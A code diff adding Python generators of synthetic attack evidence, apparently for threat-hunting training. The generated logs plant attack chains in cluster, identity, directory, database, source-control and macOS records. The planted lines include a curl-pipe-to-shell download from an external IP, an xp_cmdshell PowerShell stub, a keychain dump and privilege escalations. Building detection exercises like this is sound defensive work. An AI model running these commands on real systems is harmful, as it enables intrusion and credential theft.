@@ -357,6 +357,233 @@ def m365_audit(rng: random.Random) -> str:
     return "\n".join(rows) + "\n"
 
 
+def kubernetes_audit(rng: random.Random) -> str:
+    """Cluster audit records with a short compromise path planted inside."""
+    rows = []
+
+    def record(offset, user, verb, resource, name, namespace="prod", subresource=None,
+               source="10.20.7.40", code=200):
+        payload = {
+            "kind": "Event",
+            "apiVersion": "audit.k8s.io/v1",
+            "level": "Metadata",
+            "auditID": f"{rng.getrandbits(64):016x}",
+            "verb": verb,
+            "requestURI": f"/api/v1/namespaces/{namespace}/{resource}/{name}"
+                          + (f"/{subresource}" if subresource else ""),
+            "user": {"username": user, "groups": ["system:authenticated"]},
+            "objectRef": {"resource": resource, "name": name, "namespace": namespace},
+            "sourceIPs": [source],
+            "responseStatus": {"code": code},
+            "requestReceivedTimestamp": iso(offset),
+        }
+        if subresource:
+            payload["objectRef"]["subresource"] = subresource
+        return json.dumps(payload)
+
+    for index in range(300):
+        rows.append(record(index * 45, "system:serviceaccount:kube-system:deployment-controller",
+                           rng.choice(["get", "list", "watch"]),
+                           rng.choice(["pods", "deployments", "configmaps"]),
+                           f"app-{rng.randint(1, 40)}"))
+    # Compromised pipeline token: enumerate, read secrets, escalate, break out.
+    for index in range(22):
+        rows.append(record(11000 + index * 7, "system:serviceaccount:prod:ci-deployer", "list",
+                           "secrets", f"app-secret-{index}", source="10.20.7.99"))
+    rows.append(record(11200, "system:serviceaccount:prod:ci-deployer", "create", "pods", "web-1",
+                       subresource="exec", source="10.20.7.99", code=201))
+    rows.append(json.dumps({
+        "kind": "Event", "apiVersion": "audit.k8s.io/v1", "verb": "create",
+        "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+        "user": {"username": "system:serviceaccount:prod:ci-deployer"},
+        "objectRef": {"resource": "clusterrolebindings", "name": "ci-deployer-admin"},
+        "sourceIPs": ["10.20.7.99"], "responseStatus": {"code": 201},
+        "requestObject": {"roleRef": {"kind": "ClusterRole", "name": "cluster-admin"}},
+        "requestReceivedTimestamp": iso(11300),
+    }))
+    rows.append(json.dumps({
+        "kind": "Event", "apiVersion": "audit.k8s.io/v1", "verb": "create",
+        "requestURI": "/api/v1/namespaces/prod/pods",
+        "user": {"username": "system:serviceaccount:prod:ci-deployer"},
+        "objectRef": {"resource": "pods", "name": "debug-shell", "namespace": "prod"},
+        "sourceIPs": ["10.20.7.99"], "responseStatus": {"code": 201},
+        "requestObject": {"spec": {"hostPID": True, "containers": [
+            {"name": "shell", "image": "docker.io/library/alpine:latest",
+             "securityContext": {"privileged": True}}]}},
+        "requestReceivedTimestamp": iso(11400),
+    }))
+    return "\n".join(rows) + "\n"
+
+
+def identity_provider(rng: random.Random) -> str:
+    """Identity provider system log with a takeover sequence."""
+    rows = []
+
+    def event(offset, actor, event_type, message, result="SUCCESS", ip="10.20.4.60"):
+        return json.dumps({
+            "uuid": f"{rng.getrandbits(64):016x}",
+            "published": iso(offset),
+            "eventType": event_type,
+            "displayMessage": message,
+            "actor": {"alternateId": actor, "displayName": actor.split("@")[0], "type": "User"},
+            "client": {"ipAddress": ip, "userAgent": {"rawUserAgent": "Mozilla/5.0"}},
+            "outcome": {"result": result},
+        })
+
+    for index in range(250):
+        rows.append(event(index * 70, f"{rng.choice(USERS)}@corp.example",
+                          "user.authentication.sso", "User single sign on to app"))
+    # Push fatigue against one account, then the takeover actions.
+    for index in range(14):
+        rows.append(event(10500 + index * 20, "p.novak@corp.example",
+                          "user.authentication.auth_via_mfa",
+                          "Authentication of user via MFA", result="FAILURE", ip="45.155.205.87"))
+    rows.append(event(10800, "p.novak@corp.example", "user.authentication.auth_via_mfa",
+                      "Authentication of user via MFA", ip="45.155.205.87"))
+    rows.append(event(10860, "p.novak@corp.example", "user.session.start",
+                      "Anomalous token detected, token replay suspected", ip="45.155.205.87"))
+    rows.append(event(10920, "p.novak@corp.example", "user.account.privilege.grant",
+                      "Assign super admin role to user", ip="45.155.205.87"))
+    rows.append(event(10980, "p.novak@corp.example", "system.api_token.create",
+                      "Create API token for organisation", ip="45.155.205.87"))
+    return "\n".join(rows) + "\n"
+
+
+def directory_events(rng: random.Random) -> str:
+    """Domain controller records covering the certificate and delegation paths."""
+    rows = []
+    for index in range(220):
+        rows.append(json.dumps({
+            "@timestamp": iso(index * 55), "Channel": "Security", "EventID": 4662,
+            "Computer": "DC-CORP-01", "SubjectUserName": rng.choice(USERS),
+            "ObjectName": f"CN=Group{rng.randint(1, 60)},OU=Groups,DC=corp,DC=local",
+            "AccessMask": "0x100",
+        }))
+    rows.append(json.dumps({
+        "@timestamp": iso(11500), "Channel": "Security", "EventID": 4886,
+        "Computer": "CA-CORP-01", "Requester": "CORP\\svc_backup",
+        "SubjectUserName": "svc_backup", "TemplateName": "UserAuthentication",
+        "Attributes": "SAN:upn=administrator@corp.local", "Message":
+            "Certificate Services received a certificate request with enrollee_supplies_subject",
+    }))
+    rows.append(json.dumps({
+        "@timestamp": iso(11560), "Channel": "Security", "EventID": 5136,
+        "Computer": "DC-CORP-01", "SubjectUserName": "svc_backup",
+        "ObjectDN": "CN=SRV-FILE-01,OU=Servers,DC=corp,DC=local",
+        "AttributeLDAPDisplayName": "msDS-KeyCredentialLink", "OperationType": "Value Added",
+        "Message": "A directory service object was modified: msDS-KeyCredentialLink",
+    }))
+    rows.append(json.dumps({
+        "@timestamp": iso(11620), "Channel": "Security", "EventID": 5136,
+        "Computer": "DC-CORP-01", "SubjectUserName": "svc_backup",
+        "ObjectDN": "CN=SRV-APP-02,OU=Servers,DC=corp,DC=local",
+        "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+        "OperationType": "Value Added",
+        "Message": "Resource based constrained delegation configured",
+    }))
+    rows.append(json.dumps({
+        "@timestamp": iso(11680), "Channel": "Security", "EventID": 5137,
+        "Computer": "DC-CORP-01", "SubjectUserName": "svc_backup",
+        "ObjectDN": "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local",
+        "Message": "A directory service object was created under \\\\corp.local\\sysvol\\policies",
+    }))
+    rows.append(json.dumps({
+        "@timestamp": iso(11740), "Channel": "Security", "EventID": 4741,
+        "Computer": "DC-CORP-01", "SubjectUserName": "j.dupont",
+        "TargetUserName": "EVILPC$", "Message": "A computer account was created",
+    }))
+    for index in range(55):
+        rows.append(json.dumps({
+            "@timestamp": iso(11800 + index * 5), "Channel": "Security", "EventID": 4662,
+            "Computer": "DC-CORP-01", "SubjectUserName": "svc_backup",
+            "ObjectName": f"CN=User{index},OU=Staff,DC=corp,DC=local",
+            "Message": "sharphound collection", "AccessMask": "0x100",
+        }))
+    return "\n".join(rows) + "\n"
+
+
+def database_log(rng: random.Random) -> str:
+    """Database engine log with an injection follow through."""
+    rows = []
+    for index in range(180):
+        moment = ts(index * 80).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+        rows.append(f"{moment} spid{rng.randint(50, 90)}      Login succeeded for user 'app_service'. "
+                    f"Source: 10.20.9.20")
+    for index in range(24):
+        moment = ts(8100 + index * 12).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+        rows.append(f"{moment} Logon       Login failed for user 'sa'. Reason: Password did not match. "
+                    f"[CLIENT: 203.0.113.45] Error: 18456, Severity: 14, State: 8.")
+    moment = ts(8500).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    rows.append(f"{moment} spid57      Configuration option 'xp_cmdshell' changed from 0 to 1. "
+                f"Run the RECONFIGURE statement to install.")
+    moment = ts(8560).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    rows.append(f"{moment} spid57      EXEC xp_cmdshell 'powershell -enc "
+                f"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=='")
+    moment = ts(8620).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    rows.append(f"{moment} spid57      CREATE LOGIN [svc_report] WITH PASSWORD = '****'; "
+                f"EXEC sp_addsrvrolemember 'svc_report', 'sysadmin';")
+    moment = ts(8680).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    rows.append(f"{moment} spid57      BACKUP DATABASE [Finance] TO DISK = "
+                f"'C:\\Users\\Public\\finance.bak' WITH COPY_ONLY")
+    return "\n".join(rows) + "\n"
+
+
+def scm_audit(rng: random.Random) -> str:
+    """Source control and pipeline audit entries."""
+    rows = []
+    for index in range(140):
+        rows.append(json.dumps({
+            "@timestamp": iso(index * 90), "action": rng.choice(["repo.push", "pull_request.create",
+                                                                 "pull_request.merge", "issues.opened"]),
+            "actor": rng.choice(USERS), "repo": f"corp/service-{rng.randint(1, 12)}",
+            "actor_ip": rng.choice(INTERNAL),
+        }))
+    rows.append(json.dumps({"@timestamp": iso(11900), "action": "personal_access_token.create",
+                            "actor": "c.moreau", "actor_ip": "45.155.205.87",
+                            "message": "Create access token with repo and workflow scope"}))
+    rows.append(json.dumps({"@timestamp": iso(11960), "action": "workflows.updated_workflow_file",
+                            "actor": "c.moreau", "repo": "corp/service-1", "actor_ip": "45.155.205.87",
+                            "path": ".github/workflows/release.yml",
+                            "message": "Workflow file .github/workflows/release.yml updated"}))
+    rows.append(json.dumps({"@timestamp": iso(12020), "action": "repo.visibility_change",
+                            "actor": "c.moreau", "repo": "corp/service-1", "actor_ip": "45.155.205.87",
+                            "message": "Repository made public"}))
+    rows.append(json.dumps({"@timestamp": iso(12080), "action": "org.runner_registered",
+                            "actor": "c.moreau", "actor_ip": "45.155.205.87",
+                            "message": "Self-hosted runner registered to the organisation"}))
+    rows.append(json.dumps({"@timestamp": iso(12140), "action": "build.log", "actor": "ci",
+                            "message": "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE and continue"}))
+    return "\n".join(rows) + "\n"
+
+
+def macos_endpoint(rng: random.Random) -> str:
+    """macOS telemetry with a full infection chain."""
+    rows = ["timestamp,host,user,process,command,path"]
+    for index in range(200):
+        rows.append(",".join([
+            iso(index * 60), f"MBP-{rng.randint(1, 40):03d}", rng.choice(USERS),
+            rng.choice(["Finder", "Safari", "Slack", "mdworker", "syspolicyd"]),
+            "routine activity", "/Applications",
+        ]))
+    host, user = "MBP-014", "a.schmidt"
+    rows.append(",".join([iso(9700), host, user, "osascript",
+                          "osascript -e 'do shell script \"curl -s http://185.220.101.44/p | sh\" "
+                          "with administrator privileges'", "/usr/bin/osascript"]))
+    rows.append(",".join([iso(9760), host, user, "bash",
+                          "xattr -d com.apple.quarantine /Users/Shared/updater", "/bin/bash"]))
+    rows.append(",".join([iso(9820), host, user, "spctl", "spctl --master-disable", "/usr/sbin/spctl"]))
+    rows.append(",".join([iso(9880), host, user, "bash",
+                          "cp /Users/Shared/com.apple.updater.plist /Library/LaunchDaemons/",
+                          "/Library/LaunchDaemons/com.apple.updater.plist"]))
+    rows.append(",".join([iso(9940), host, user, "launchctl",
+                          "launchctl load -w /Library/LaunchDaemons/com.apple.updater.plist",
+                          "/bin/launchctl"]))
+    rows.append(",".join([iso(10000), host, user, "security",
+                          "security dump-keychain -d /Users/a.schmidt/Library/Keychains/login.keychain-db",
+                          "/usr/bin/security"]))
+    return "\n".join(rows) + "\n"
+
+
 def build(destination: Path, seed: int = 7) -> Path:
     rng = random.Random(seed)
     files = {
@@ -368,6 +595,12 @@ def build(destination: Path, seed: int = 7) -> Path:
         "network/firewall-flows.csv": flow_log(rng),
         "cloud/cloudtrail.json": cloudtrail(rng),
         "cloud/m365-audit.csv": m365_audit(rng),
+        "cloud/kubernetes-audit.json": kubernetes_audit(rng),
+        "identity/idp-system-log.json": identity_provider(rng),
+        "windows/directory-events.json": directory_events(rng),
+        "database/sqlserver-errorlog.log": database_log(rng),
+        "scm/source-control-audit.json": scm_audit(rng),
+        "macos/endpoint-telemetry.csv": macos_endpoint(rng),
         "README.txt": "Synthetic evidence generated for Threat Hunting Factory demonstrations.\n",
     }
     destination.parent.mkdir(parents=True, exist_ok=True)
